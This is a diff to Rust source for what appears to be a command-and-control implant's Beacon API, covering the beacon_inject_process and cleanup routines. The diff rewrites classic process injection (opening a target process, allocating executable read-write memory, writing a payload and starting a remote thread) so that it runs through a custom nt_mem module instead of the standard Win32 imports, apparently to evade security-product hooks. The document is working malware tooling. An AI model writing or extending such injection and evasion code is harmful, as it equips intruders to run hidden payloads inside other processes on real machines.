@@ -8,16 +8,12 @@ use std::{
 };
 
 macro_rules! warn { ($($t:tt)*) => {} }
+use crate::nt_mem;
 use windows::Win32::{
-    Foundation::{CloseHandle, HANDLE},
+    Foundation::HANDLE,
     Security::{GetTokenInformation, RevertToSelf, TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY},
-    System::{
-        Diagnostics::Debug::WriteProcessMemory,
-        Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
-        Threading::{
-            CreateRemoteThread, GetCurrentProcess, OpenProcess, OpenProcessToken, SetThreadToken,
-            PROCESS_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, STARTUPINFOA,
-        },
+    System::Threading::{
+        GetCurrentProcess, OpenProcessToken, SetThreadToken, PROCESS_INFORMATION, STARTUPINFOA,
     },
 };
 
@@ -708,59 +704,57 @@ extern "C" fn beacon_inject_process(
     a_len: c_int,
 ) {
     unsafe {
-        if let Ok(process_handle) =
-            OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, false, pid as u32)
-        {
-            if process_handle.is_invalid() {
-                return;
-            }
+        // Rights needed for remote alloc + write + thread create
+        const PROCESS_CREATE_THREAD: u32 = 0x0002;
+        const PROCESS_VM_OPERATION: u32 = 0x0008;
+        const PROCESS_VM_WRITE: u32 = 0x0020;
+        const PROCESS_VM_READ: u32 = 0x0010;
+        const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
+        let access = PROCESS_CREATE_THREAD
+            | PROCESS_VM_OPERATION
+            | PROCESS_VM_WRITE
+            | PROCESS_VM_READ
+            | PROCESS_QUERY_INFORMATION;
 
-            let payload_slice = std::slice::from_raw_parts(payload.cast::<u8>(), p_len as usize);
-            let _arg_slice = std::slice::from_raw_parts(arg.cast::<u8>(), a_len as usize);
+        let process_handle = nt_mem::open_process(pid as u32, access);
+        if process_handle.is_null() {
+            return;
+        }
 
-            let remote_payload_address = VirtualAllocEx(
-                process_handle,
-                None,
-                payload_slice.len(),
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_EXECUTE_READWRITE,
-            );
+        let payload_slice = std::slice::from_raw_parts(payload.cast::<u8>(), p_len as usize);
+        let _arg_slice = std::slice::from_raw_parts(arg.cast::<u8>(), a_len as usize);
 
-            if remote_payload_address.is_null() {
-                let _ = CloseHandle(process_handle);
-                return;
-            }
+        let remote_payload_address = nt_mem::allocate_remote(
+            process_handle,
+            payload_slice.len(),
+            nt_mem::PAGE_EXECUTE_READWRITE,
+        );
 
-            if WriteProcessMemory(
-                process_handle,
-                remote_payload_address,
-                payload_slice.as_ptr().cast(),
-                payload_slice.len(),
-                None,
-            )
-            .is_err()
-            {
-                let _ = CloseHandle(process_handle);
-                return;
-            }
+        if remote_payload_address.is_null() {
+            nt_mem::close_handle(process_handle);
+            return;
+        }
 
-            if let Ok(thread) = CreateRemoteThread(
-                process_handle,
-                None,
-                0,
-                Some(std::mem::transmute::<
-                    *mut std::ffi::c_void,
-                    unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
-                >(remote_payload_address)),
-                None,
-                0,
-                None,
-            ) {
-                let _ = CloseHandle(thread);
-            };
+        if !nt_mem::write_memory(
+            process_handle,
+            remote_payload_address,
+            payload_slice.as_ptr(),
+            payload_slice.len(),
+        ) {
+            nt_mem::close_handle(process_handle);
+            return;
+        }
 
-            let _ = CloseHandle(process_handle);
-        };
+        let thread = nt_mem::create_remote_thread(
+            process_handle,
+            remote_payload_address,
+            std::ptr::null_mut(),
+        );
+        if !thread.is_null() {
+            nt_mem::close_handle(thread);
+        }
+
+        nt_mem::close_handle(process_handle);
     }
 }
 
@@ -798,8 +792,8 @@ extern "C" fn beacon_spawn_temporary_process(
 #[no_mangle]
 extern "C" fn beacon_cleanup_process(pinfo: *const PROCESS_INFORMATION) {
     unsafe {
-        let _ = CloseHandle((*pinfo).hProcess);
-        let _ = CloseHandle((*pinfo).hThread);
+        nt_mem::close_handle((*pinfo).hProcess.0);
+        nt_mem::close_handle((*pinfo).hThread.0);
     }
 }
 
